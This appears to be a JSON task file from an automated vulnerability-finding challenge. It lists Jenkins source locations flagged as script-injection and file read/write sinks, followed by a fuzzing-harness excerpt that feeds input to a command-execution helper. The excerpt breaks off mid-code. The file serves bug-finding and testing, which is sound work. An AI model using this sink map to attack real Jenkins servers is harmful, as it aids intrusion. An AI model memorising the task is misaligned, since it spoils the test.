                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/MongoDBKnowledgeBase.java",
                "line": 818,
                "column": 45
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/MongoDBKnowledgeBase.java",
                "line": 851,
                "column": 45
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/MongoDBKnowledgeBase.java",
                "line": 723,
                "column": 51
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/FailureReader.java",
                "line": 385,
                "column": 56
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/FoundFailureCause.java",
                "line": 194,
                "column": 72
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/FoundFailureCause.java",
                "line": 218,
                "column": 13
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/FoundFailureCause.java",
                "line": 224,
                "column": 62
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/FoundFailureCause.java",
                "line": 228,
                "column": 61
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/BuildLogIndication.java",
                "line": 88,
                "column": 40
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/BuildLogIndication.java",
                "line": 260,
                "column": 73
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/BuildLogIndication.java",
                "line": 260,
                "column": 48
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/BuildLogIndication.java",
                "line": 271,
                "column": 43
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/BuildLogIndication.java",
                "line": 281,
                "column": 74
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/BuildLogIndication.java",
                "line": 282,
                "column": 103
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/BuildLogIndication.java",
                "line": 339,
                "column": 61
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/BuildLogIndication.java",
                "line": 358,
                "column": 31
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/BuildLogIndication.java",
                "line": 371,
                "column": 28
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/FoundIndication.java",
                "line": 175,
                "column": 50
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/Indication.java",
                "line": 130,
                "column": 33
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/MultilineBuildLogIndication.java",
                "line": 68,
                "column": 40
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/tokens/TokenUtils.java",
                "line": 50,
                "column": 67
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/tokens/TokenUtils.java",
                "line": 54,
                "column": 75
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/adapter/IstanbulCoberturaReportAdapter.java",
                "line": 100,
                "column": 41
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/adapter/parser/JavaCoverageParser.java",
                "line": 110,
                "column": 36
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/CoverageNode.java",
                "line": 535,
                "column": 73
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/CoverageNodeConverter.java",
                "line": 65,
                "column": 56
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/CoverageViewModel.java",
                "line": 449,
                "column": 37
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/PackageCoverageNode.java",
                "line": 23,
                "column": 47
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/visualization/code/SourceCodeFacade.java",
                "line": 331,
                "column": 59
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/visualization/colorization/ColorProviderFactory.java",
                "line": 94,
                "column": 46
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/visualization/dashboard/CoverageColumn.java",
                "line": 186,
                "column": 29
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/targets/CoverageResult.java",
                "line": 427,
                "column": 37
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/targets/CoverageResult.java",
                "line": 629,
                "column": 81
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/targets/CoverageResult.java",
                "line": 629,
                "column": 57
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/targets/CoverageResult.java",
                "line": 629,
                "column": 32
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/AccessFilter.java",
                "line": 87,
                "column": 43
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Api.java",
                "line": 144,
                "column": 42
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java",
                "line": 45,
                "column": 27
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/StateMonitor.java",
                "line": 46,
                "column": 35
            }
        ],
        "Script Engine Injection": [
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/RemotingDiagnostics.java",
                "line": 149,
                "column": 48
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/groovy/GroovyHookScript.java",
                "line": 136,
                "column": 36
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/Script.java",
                "line": 84,
                "column": 27
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ExtensionFinder.java",
                "line": 634,
                "column": 25
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ExtensionFinder.java",
                "line": 634,
                "column": 46
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/cli/declarative/MethodBinder.java",
                "line": 115,
                "column": 20
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/cli/declarative/MethodBinder.java",
                "line": 115,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/init/TaskMethodFinder.java",
                "line": 109,
                "column": 13
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/init/TaskMethodFinder.java",
                "line": 110,
                "column": 17
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Executor.java",
                "line": 962,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Executor.java",
                "line": 962,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 1071,
                "column": 29
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 1072,
                "column": 89
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/queue/Executables.java",
                "line": 53,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/queue/Executables.java",
                "line": 53,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/search/ParsedQuickSilver.java",
                "line": 125,
                "column": 24
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/search/ParsedQuickSilver.java",
                "line": 125,
                "column": 38
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/jna/InitializationErrorInvocationHandler.java",
                "line": 26,
                "column": 20
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/jna/InitializationErrorInvocationHandler.java",
                "line": 26,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/ClassLoaderReflectionToolkit.java",
                "line": 35,
                "column": 20
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/ClassLoaderReflectionToolkit.java",
                "line": 35,
                "column": 34
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/JenkinsLocationConfiguration.java",
                "line": 178,
                "column": 42
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/JenkinsLocationConfiguration.java",
                "line": 178,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/JenkinsLocationConfiguration.java",
                "line": 183,
                "column": 13
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/JenkinsLocationConfiguration.java",
                "line": 183,
                "column": 30
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/slaves/DefaultJnlpSlaveReceiver.java",
                "line": 73,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/slaves/DefaultJnlpSlaveReceiver.java",
                "line": 73,
                "column": 62
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/slaves/DefaultJnlpSlaveReceiver.java",
                "line": 81,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/slaves/DefaultJnlpSlaveReceiver.java",
                "line": 81,
                "column": 62
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/triggers/SCMTriggerItem.java",
                "line": 168,
                "column": 56
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/triggers/SCMTriggerItem.java",
                "line": 168,
                "column": 109
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/ProgressiveRendering.java",
                "line": 150,
                "column": 13
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/ProgressiveRendering.java",
                "line": 150,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/ProgressiveRendering.java",
                "line": 172,
                "column": 40
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/ProgressiveRendering.java",
                "line": 172,
                "column": 54
            },
            {
                "path": "src/jenkins/war/src/main/java/executable/Main.java",
                "line": 347,
                "column": 13
            },
            {
                "path": "src/jenkins/war/src/main/java/executable/Main.java",
                "line": 347,
                "column": 31
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/dbf/ParameterizedTriggerDBF.java",
                "line": 80,
                "column": 30
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/dbf/ParameterizedTriggerDBF.java",
                "line": 80,
                "column": 44
            }
        ],
        "File read/write hook path": [
            {
                "path": "src/jenkins/cli/src/main/java/hudson/cli/CLI.java",
                "line": 338,
                "column": 33
            },
            {
                "path": "src/jenkins/cli/src/main/java/hudson/cli/PrivateKeyProvider.java",
                "line": 134,
                "column": 52
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java",
                "line": 128,
                "column": 77
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java",
                "line": 142,
                "column": 71
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java",
                "line": 177,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 1656,
                "column": 53
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 1799,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2221,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2463,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2483,
                "column": 42
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2496,
                "column": 69
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2524,
                "column": 59
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2687,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Main.java",
                "line": 148,
                "column": 58
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Main.java",
                "line": 182,
                "column": 64
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginWrapper.java",
                "line": 760,
                "column": 54
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Util.java",
                "line": 263,
                "column": 52
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Util.java",
                "line": 684,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Util.java",
                "line": 1080,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Util.java",
                "line": 1445,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/WebAppMain.java",
                "line": 292,
                "column": 53
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/XmlFile.java",
                "line": 164,
                "column": 76
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/XmlFile.java",
                "line": 191,
                "column": 76
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/XmlFile.java",
                "line": 273,
                "column": 64
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/XmlFile.java",
                "line": 323,
                "column": 52
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/init/impl/InitialUserContent.java",
                "line": 48,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/lifecycle/WindowsServiceLifecycle.java",
                "line": 116,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/AbstractItem.java",
                "line": 854,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/FileParameterValue.java",
                "line": 264,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/FileParameterValue.java",
                "line": 290,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/FileParameterValue.java",
                "line": 341,
                "column": 42
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Run.java",
                "line": 1507,
                "column": 56
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Run.java",
                "line": 1985,
                "column": 42
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 1316,
                "column": 64
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/scm/SCM.java",
                "line": 745,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/triggers/SCMTrigger.java",
                "line": 721,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/triggers/SCMTrigger.java",
                "line": 749,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/BootFailure.java",
                "line": 65,
                "column": 85
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/CompressedFile.java",
                "line": 84,
                "column": 38
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/CompressedFile.java",
                "line": 92,
                "column": 41
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/CompressedFile.java",
                "line": 97,
                "column": 61
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/CompressedFile.java",
                "line": 145,
                "column": 62
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/DoubleLaunchChecker.java",
                "line": 100,
                "column": 48
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/DoubleLaunchChecker.java",
                "line": 111,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/FileChannelWriter.java",
                "line": 65,
                "column": 36
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/IOUtils.java",
                "line": 44,
                "column": 52
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/IOUtils.java",
                "line": 52,
                "column": 55
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/ProcessTree.java",
                "line": 888,
                "column": 65
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/ProcessTree.java",
                "line": 915,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/ProcessTree.java",
                "line": 939,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/SecretRewriter.java",
                "line": 88,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/StreamTaskListener.java",
                "line": 110,
                "column": 36
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/StreamTaskListener.java",
                "line": 135,
                "column": 17
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/TextFile.java",
                "line": 71,
                "column": 58
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/io/ReopenableFileOutputStream.java",
                "line": 60,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/io/RewindableFileOutputStream.java",
                "line": 58,
                "column": 53
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/io/TarArchiver.java",
                "line": 105,
                "column": 61
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/diagnosis/HsErrPidList.java",
                "line": 55,
                "column": 52
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/diagnosis/HsErrPidList.java",
                "line": 128,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/install/InstallUtil.java",
                "line": 214,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/install/InstallUtil.java",
                "line": 257,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/install/InstallUtil.java",
                "line": 323,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/install/SetupWizard.java",
                "line": 250,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/install/SetupWizard.java",
                "line": 464,
                "column": 27
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/install/SetupWizard.java",
                "line": 488,
                "column": 74
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/RunIdMigrator.java",
                "line": 111,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/RunIdMigrator.java",
                "line": 257,
                "column": 47
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/RunIdMigrator.java",
                "line": 268,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/RunIdMigrator.java",
                "line": 389,
                "column": 43
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/RunIdMigrator.java",
                "line": 407,
                "column": 31
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/monitor/OperatingSystemEndOfLifeAdminMonitor.java",
                "line": 190,
                "column": 97
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/DefaultConfidentialStore.java",
                "line": 78,
                "column": 59
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/DefaultConfidentialStore.java",
                "line": 104,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/stapler/StaplerDispatchValidator.java",
                "line": 283,
                "column": 54
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/stapler/StaticRoutingDecisionProvider.java",
                "line": 206,
                "column": 25
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/stapler/StaticRoutingDecisionProvider.java",
                "line": 239,
                "column": 40
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/slaves/restarter/UnixSlaveRestarter.java",
                "line": 85,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/JSONSignatureValidator.java",
                "line": 294,
                "column": 60
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/VirtualFile.java",
                "line": 742,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/io/FileBoolean.java",
                "line": 65,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java",
                "line": 165,
                "column": 65
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/xml/XMLUtils.java",
                "line": 182,
                "column": 65
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java",
                "line": 160,
                "column": 21
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/visualization/code/SourceCodeFacade.java",
                "line": 451,
                "column": 70
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/model/visualization/code/SourceCodeFacade.java",
                "line": 452,
                "column": 61
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2571,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2659,
                "column": 39
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2892,
                "column": 55
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2906,
                "column": 51
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 1900,
                "column": 35
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/Util.java",
                "line": 1321,
                "column": 45
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/cli/InstallPluginCommand.java",
                "line": 188,
                "column": 38
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Computer.java",
                "line": 1691,
                "column": 44
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/ItemGroupMixIn.java",
                "line": 247,
                "column": 62
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Job.java",
                "line": 665,
                "column": 54
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Queue.java",
                "line": 439,
                "column": 48
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Run.java",
                "line": 1667,
                "column": 25
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 2742,
                "column": 46
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UpdateCenter.java",
                "line": 2746,
                "column": 50
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UserIdMigrator.java",
                "line": 86,
                "column": 58
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/UserIdMigrator.java",
                "line": 97,
                "column": 58
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/AtomicFileWriter.java",
                "line": 195,
                "column": 33
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/AtomicFileWriter.java",
                "line": 210,
                "column": 37
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/io/ReopenableRotatingFileOutputStream.java",
                "line": 68,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/io/RewindableRotatingFileOutputStream.java",
                "line": 67,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/model/RunIdMigrator.java",
                "line": 285,
                "column": 38
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 1640,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/util/TextFile.java",
                "line": 117,
                "column": 40
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/security/ClassFilterImpl.java",
                "line": 225,
                "column": 67
            },
            {
                "path": "src/jenkins/war/src/main/java/executable/Main.java",
                "line": 441,
                "column": 53
            },
            {
                "path": "src/jenkins/war/src/main/java/executable/Main.java",
                "line": 475,
                "column": 88
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/BuildFailureScanner.java",
                "line": 128,
                "column": 61
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java",
                "line": 148,
                "column": 62
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java",
                "line": 129,
                "column": 67
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/sod/ScanOnDemandTask.java",
                "line": 112,
                "column": 61
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/CoverageProcessor.java",
                "line": 716,
                "column": 83
            },
            {
                "path": "src/plugins/code-coverage-api-plugin/src/main/java/io/jenkins/plugins/coverage/CoverageProcessor.java",
                "line": 732,
                "column": 114
            },
            {
                "path": "src/plugins/toy-plugin/src/main/java/io/jenkins/plugins/toyplugin/SecretMessage.java",
                "line": 20,
                "column": 58
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/FailureReader.java",
                "line": 383,
                "column": 51
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/indication/FoundIndication.java",
                "line": 173,
                "column": 45
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 1135,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 1881,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 1135,
                "column": 17
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 1881,
                "column": 13
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2659,
                "column": 24
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2892,
                "column": 40
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/FilePath.java",
                "line": 2906,
                "column": 36
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 1900,
                "column": 28
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/cli/InstallPluginCommand.java",
                "line": 97,
                "column": 49
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/cli/InstallPluginCommand.java",
                "line": 97,
                "column": 56
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/FileParameterDefinition.java",
                "line": 125,
                "column": 45
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/FileParameterDefinition.java",
                "line": 125,
                "column": 60
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/ItemGroupMixIn.java",
                "line": 247,
                "column": 20
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 667,
                "column": 47
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 737,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/PluginManager.java",
                "line": 741,
                "column": 57
            },
            {
                "path": "src/jenkins/core/src/main/java/hudson/model/Slave.java",
                "line": 440,
                "column": 64
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/JSONSignatureValidator.java",
                "line": 260,
                "column": 72
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/groovy/GroovyHookScript.java",
                "line": 80,
                "column": 54
            },
            {
                "path": "src/jenkins/core/src/main/java/jenkins/util/groovy/GroovyHookScript.java",
                "line": 91,
                "column": 62
            },
            {
                "path": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/ScanLogAction.java",
                "line": 75,
                "column": 43
            }
        ]
    },
    "tasks": [
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-two/src/main/java/com/aixcc/jenkins/harnesses/two/JenkinsTwo.java:\n 38       public static void fuzzerTestOneInput(byte[] data) throws Exception {\n 39           new JenkinsTwo().fuzz(data);\n 40       }\n 48       private void fuzz(byte[] data) {\n 49           if (data.length < expected_data_length) {\n 50               return;\n 51           }\n 52   \n 53           ByteBuffer buf = ByteBuffer.wrap(data);\n 54           int picker = buf.getInt();\n 55           int count = buf.getInt();\n 56   \n 57           if (count > 255) return;\n 58   \n 59           String whole = new String(Arrays.copyOfRange(data, 8, data.length));\n 60   \n 61           String[] parts = whole.split(\"\\0\");\n 62   \n 63           if (3 != parts.length) {\n 64               return;\n 65           }\n 66   \n 67           setup_utilmain();\n 68           try {\n 69               setup_replacer();\n 70           } catch (Exception e) {\n 71               return; // eat it\n 72           }\n 73   \n 74           set_header(parts[0], parts[1]);\n 75   \n 76           for (int i = 0; i < count; i++) {\n 77               try {\n 78                   switch (picker) {\n 79                       case 13:\n 80                           nw.doexecCommandUtils(parts[2], req, resp);\n 81                           break;\n 82                       default:\n 83                           throw new Exception(\"unsupported method picker\");\n 84                   }\n 85               } catch 